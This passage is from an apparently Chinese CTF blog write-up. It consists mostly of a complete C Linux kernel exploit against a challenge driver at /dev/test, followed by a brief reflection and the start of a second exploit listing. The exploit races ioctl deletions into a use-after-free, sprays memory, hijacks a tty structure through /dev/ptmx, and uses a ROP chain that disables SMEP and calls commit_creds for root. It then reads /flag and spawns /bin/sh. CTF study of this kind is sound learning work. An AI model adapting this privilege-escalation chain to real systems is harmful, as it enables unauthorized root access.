class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pty.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> threadnum 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> spray_times 1024</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mmap_size 1024*64</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_chunk</span>&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">    <span class="keyword">char</span>* buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_chunk</span>* <span class="title">user_ptr</span>;</span></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">char</span>* mmap_arry[spray_times];</span><br><span class="line"><span class="keyword">int</span> ptmx;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> show_key;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(<span class="keyword">size_t</span> size,<span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    user_ptr-&gt;size = size;</span><br><span class="line">    user_ptr-&gt;buf = buf;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(fd,<span class="number">0x23334</span>,user_ptr) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        show_key = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">new</span><span class="params">(<span class="keyword">size_t</span> size,<span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    user_ptr-&gt;size = size;</span><br><span class="line">    user_ptr-&gt;buf = buf;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(fd,<span class="number">0x23333</span>,user_ptr) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]new error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(fd,<span class="number">0x23335</span>,user_ptr) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]delete error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">race_delete</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">delete</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span>* check()&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; spray_times;i++)&#123;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> *p = mmap_arry[i];</span><br><span class="line">		<span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (j &lt; mmap_size/<span class="number">8</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (p[j] != <span class="number">0x6161616161616161</span>)&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">"[:)]find it!!!"</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"[:)]object = %p\n"</span>,p[j]);</span><br><span class="line">				<span class="keyword">return</span> &amp;p[j];</span><br><span class="line">            &#125;</span><br><span class="line">			j += <span class="number">0x200</span>;</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:)]Root now!!!"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd = open(<span class="string">"/flag"</span>,O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"[:(]open flag error..."</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">char</span>* buf = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">        memset(buf,'\x00',0x100);</span><br><span class="line">        read(fd,buf,<span class="number">0x100</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[:)]flag is here: %s\n"</span>,buf);</span><br><span class="line">        <span class="keyword">char</span>* args[<span class="number">2</span>] = &#123;<span class="string">"/bin/sh"</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">        execv(<span class="string">"/bin/sh"</span>, args);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Not root..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rsp,user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">"mov user_cs,cs;"</span></span><br><span class="line">        <span class="string">"mov user_ss,ss;"</span></span><br><span class="line">        <span class="string">"mov user_rsp,rsp;"</span></span><br><span class="line">        <span class="string">"pushf;"</span></span><br><span class="line">        <span class="string">"pop user_rflags;"</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[:)]Save success!!!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_ptmx_slave</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *pts_name;</span><br><span class="line">	<span class="keyword">if</span> (grantpt(ptmx) &lt; <span class="number">0</span> || unlockpt(ptmx) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]grantpt and unlockpt fail\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">	pts_name = (<span class="keyword">const</span> <span class="keyword">char</span> *)ptsname(ptmx);</span><br><span class="line">	<span class="keyword">int</span> fds = open(pts_name, O_RDONLY | O_NOCTTY);</span><br><span class="line">	<span class="keyword">if</span> (fds &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]open /dev/ptmx fail\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> fds;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save();</span><br><span class="line">    signal(SIGSEGV,get_shell);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pthread_t</span> pt[threadnum];    </span><br><span class="line">    <span class="keyword">int</span> t[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">char</span>* user_buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">size_t</span> slub = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span>* user_mmap;</span><br><span class="line">    <span class="keyword">size_t</span> kernel_offset = <span class="number">0x106b4e0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> kernel_base = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">10</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		t[i] = open(<span class="string">"/dev/ptmx"</span>,O_RDWR);</span><br><span class="line">		<span class="keyword">if</span> (t[i] == <span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"[:(]open ptmx error"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">10</span>;i++)</span><br><span class="line">		close(t[i]);</span><br><span class="line"><span class="comment">//-------------------------------------------------------------------</span></span><br><span class="line">    fd = open(<span class="string">"/dev/test"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]open error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    user_ptr = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    memset(user_buf,'\x11',0x1000);</span><br><span class="line">start1:</span><br><span class="line">    <span class="keyword">new</span>(<span class="number">0x2c0</span>,user_buf);</span><br><span class="line">start2:</span><br><span class="line">    user_mmap = mmap(<span class="literal">NULL</span>,<span class="number">0x1000</span>,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(user_mmap &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]mmap error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; threadnum;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(pthread_create(&amp;pt[i],<span class="literal">NULL</span>,race_delete,<span class="literal">NULL</span>) != <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"[:(]pthread_create error..."</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    show(<span class="number">7</span>,user_mmap);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; threadnum;i++)&#123;</span><br><span class="line">        pthread_join(pt[i],<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(show_key == <span class="number">1</span>)&#123;</span><br><span class="line">        show_key = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> start1;</span><br><span class="line">    &#125;</span><br><span class="line">    slub = *(<span class="keyword">size_t</span>*)user_mmap;</span><br><span class="line">    <span class="keyword">if</span>(slub &lt; <span class="number">0xff000000000000</span>)&#123;</span><br><span class="line">        <span class="keyword">goto</span> start2;</span><br><span class="line">    &#125;</span><br><span class="line">    slub = slub | <span class="number">0xff00000000000000</span>;</span><br><span class="line">    slub = slub &amp; <span class="number">0xffffffffff000000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]race success!!!\n[:)]slub = %p\n"</span>,slub);</span><br><span class="line"><span class="comment">//------------------------------------------------------------------------------</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; spray_times;i++)&#123;</span><br><span class="line">        mmap_arry[i] = mmap(<span class="literal">NULL</span>,mmap_size,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(mmap_arry[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"[:(]mmap error..."</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(mmap_arry[i],<span class="string">'a'</span>,mmap_size);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//------------------------------------------------------------------------------</span></span><br><span class="line">    <span class="comment">//         0x4000000</span></span><br><span class="line">    <span class="comment">//0xffff888000200000-0xffff888000400000</span></span><br><span class="line">    <span class="comment">//0xffff888000e09000-0xffff888001000000</span></span><br><span class="line">    <span class="comment">//0xffff888001e09000-0xffff888001e0b000</span></span><br><span class="line">    <span class="comment">//0xffff888001e10000-0xffff888002000000 </span></span><br><span class="line">    <span class="comment">//0xffff888002950000-0xffff888002a90000</span></span><br><span class="line">    <span class="comment">//0xffff888002c0d000-0xffff888002c0e000</span></span><br><span class="line">    <span class="comment">//0xffff888002c10000-0xffff888004c00000</span></span><br><span class="line">    <span class="comment">//0xffff888005e15000-0xffff888005eef000</span></span><br><span class="line">    <span class="comment">//0xffff888006800000-0xffff888006a00000</span></span><br><span class="line">    <span class="comment">//0xffff888006a2e000-0xffff888007800000</span></span><br><span class="line">    <span class="comment">//0xffff888007c00000-0xffff888007fe0000  target:0xffff888007000000</span></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">int</span> tmp_fd = open(<span class="string">"./data"</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(tmp_fd == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]data_file open error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *(<span class="keyword">size_t</span>*)buf = slub;</span><br><span class="line">    <span class="keyword">if</span>(write(tmp_fd,buf,<span class="number">0x1000</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]data write error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line"><span class="comment">//------------------------------------------------------------------------------</span></span><br><span class="line">    <span class="keyword">size_t</span>* ret_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span>* tmp_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">1000</span>;i++)&#123;</span><br><span class="line">        tmp_addr = mmap(<span class="literal">NULL</span>,<span class="number">0x1000</span>,PROT_READ,MAP_PRIVATE,tmp_fd,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (tmp_addr == MAP_FAILED)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"[:(]data mmap fail..."</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; threadnum; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(pthread_create(&amp;pt[j],<span class="literal">NULL</span>,race_delete,<span class="literal">NULL</span>) != <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">"[:(]pthread error..."</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">new</span>(<span class="number">0x2c0</span>,tmp_addr);	</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; threadnum; j++)</span><br><span class="line">            pthread_join(pt[j],<span class="literal">NULL</span>);</span><br><span class="line">        ptmx = open(<span class="string">"/dev/ptmx"</span>,O_RDWR);</span><br><span class="line">        ret_addr = check();</span><br><span class="line">        <span class="keyword">if</span>(ret_addr != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        close(ptmx);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(ret_addr == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]bad luck..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(tmp_fd);</span><br><span class="line">	kernel_base = ret_addr[<span class="number">3</span>] - kernel_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]ret_addr = %p\n"</span>,ret_addr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[:)]kernel_base = %p\n"</span>, kernel_base);</span><br><span class="line">    commit_creds = kernel_base + <span class="number">0x82d30</span>;</span><br><span class="line">    prepare_kernel_cred = kernel_base + <span class="number">0x83000</span>;</span><br><span class="line">    <span class="keyword">size_t</span> key = kernel_base + <span class="number">0xC010BC</span>;</span><br><span class="line">    <span class="keyword">size_t</span> pop_rdi = kernel_base + <span class="number">0x139b</span>;</span><br><span class="line">    <span class="keyword">size_t</span> mov_cr4 = kernel_base + <span class="number">0x4f582</span>;</span><br><span class="line">    <span class="keyword">size_t</span> leave = kernel_base + <span class="number">0x1c4570</span>;</span><br><span class="line">    <span class="keyword">size_t</span> set_memory_x = kernel_base + <span class="number">0x55580</span>;</span><br><span class="line">    <span class="comment">//0xffffffff8104f582: mov cr4, rdi; push rdx; popfq; ret; </span></span><br><span class="line">    <span class="comment">//0xffffffff8100139b: pop rdi; ret;</span></span><br><span class="line">    <span class="comment">//0xffffffff811c4570: leave; ret;</span></span><br><span class="line">    <span class="comment">//0xffffffff819fe4e2: mov rdi, rax; mov qword ptr [rdi], 1; ret;</span></span><br><span class="line">    <span class="comment">//0xffffffff81a09016: swapgs; ret;  </span></span><br><span class="line">    <span class="comment">//0xffffffff81021f52: iretq; ret; </span></span><br><span class="line">    <span class="keyword">int</span> pts = get_ptmx_slave();</span><br><span class="line"></span><br><span class="line">    ret_addr[<span class="number">3</span>] = slub + <span class="number">0x300</span>;</span><br><span class="line">    ret_addr[<span class="number">0x300</span>/<span class="number">8</span>+<span class="number">12</span>] = set_memory_x;</span><br><span class="line"></span><br><span class="line">    ret_addr[<span class="number">0x500</span>/<span class="number">8</span>+<span class="number">0</span>] = pop_rdi;</span><br><span class="line">    ret_addr[<span class="number">0x500</span>/<span class="number">8</span>+<span class="number">1</span>] = <span class="number">0x6f0</span>;</span><br><span class="line">    ret_addr[<span class="number">0x500</span>/<span class="number">8</span>+<span class="number">2</span>] = mov_cr4;</span><br><span class="line">    ret_addr[<span class="number">0x500</span>/<span class="number">8</span>+<span class="number">3</span>] = pop_rdi;</span><br><span class="line">    ret_addr[<span class="number">0x500</span>/<span class="number">8</span>+<span class="number">4</span>] = <span class="number">0</span>; </span><br><span class="line">    ret_addr[<span class="number">0x500</span>/<span class="number">8</span>+<span class="number">5</span>] = (<span class="keyword">size_t</span>)prepare_kernel_cred;</span><br><span class="line">    ret_addr[<span class="number">0x500</span>/<span class="number">8</span>+<span class="number">6</span>] = kernel_base + <span class="number">0x9fe4e2</span>;</span><br><span class="line">    ret_addr[<span class="number">0x500</span>/<span class="number">8</span>+<span class="number">7</span>] = (<span class="keyword">size_t</span>)commit_creds;</span><br><span class="line">    ret_addr[<span class="number">0x500</span>/<span class="number">8</span>+<span class="number">8</span>] = kernel_base + <span class="number">0xa09016</span>;</span><br><span class="line">    ret_addr[<span class="number">0x500</span>/<span class="number">8</span>+<span class="number">9</span>] = kernel_base + <span class="number">0x21f52</span>;</span><br><span class="line">    ret_addr[<span class="number">0x500</span>/<span class="number">8</span>+<span class="number">10</span>] = (<span class="keyword">size_t</span>)get_shell;</span><br><span class="line">    ret_addr[<span class="number">0x500</span>/<span class="number">8</span>+<span class="number">11</span>] = user_cs;</span><br><span class="line">    ret_addr[<span class="number">0x500</span>/<span class="number">8</span>+<span class="number">12</span>] = user_rflags;</span><br><span class="line">    ret_addr[<span class="number">0x500</span>/<span class="number">8</span>+<span class="number">13</span>] = user_rsp;</span><br><span class="line">    ret_addr[<span class="number">0x500</span>/<span class="number">8</span>+<span class="number">14</span>] = user_ss;</span><br><span class="line">    ioctl(pts,<span class="number">0x2333</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *shellcode = <span class="string">"H\x81\xc7\x00\x05\x00\x00"</span>  <span class="comment">//add rdi,0x500;</span></span><br><span class="line">                      <span class="string">"W"</span>                          <span class="comment">//push rdi;</span></span><br><span class="line">                      <span class="string">"\x5c"</span>                       <span class="comment">//pop rsp;</span></span><br><span class="line">                      <span class="string">"\xc3"</span>;                      <span class="comment">//ret;</span></span><br><span class="line">    ret_addr[<span class="number">0x300</span>/<span class="number">8</span>+<span class="number">12</span>] = slub + <span class="number">0x400</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)ret_addr+<span class="number">0x400</span>,shellcode,<span class="number">10</span>);</span><br><span class="line">    ioctl(pts,<span class="number">0x2333</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[:(]final...."</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="反思："><a href="#反思：" class="headerlink" title="反思："></a>反思：</h2><p>查阅了一番资料，找到了一篇有写<code>ring0</code>提权的<code>shellcode</code>的文章，给出了思路之后，<code>shellcode</code>终于被我凑了出来。。。感觉应该可以通用233。</p>
<h2 id="反思exp："><a href="#反思exp：" class="headerlink" title="反思exp："></a>反思exp：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span 